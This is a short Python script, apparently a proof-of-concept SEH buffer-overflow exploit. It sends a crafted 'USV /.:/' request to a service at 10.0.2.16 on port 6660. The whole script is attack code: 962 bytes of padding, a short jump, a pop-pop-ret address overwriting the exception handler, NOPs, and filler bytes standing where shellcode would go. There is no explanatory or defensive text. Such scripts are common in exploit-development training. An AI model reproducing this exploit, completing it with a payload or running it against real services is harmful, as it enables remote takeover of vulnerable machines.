#!/usr/bin/python

import socket

host = "10.0.2.16"
port = 6660

# pop, pop, ret 0x76AEA44F
SEH = "\x4f\xa4\xae\x76"
JMP = "\xeb\x07"

buffer = "USV /.:/" + "A" * 962 + JMP + SEH + "\x90" * 10 + "C" * (5000 - 962 - len(SEH) - len(JMP) - 10) + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
print ("[+] Payload sent")
s.close()

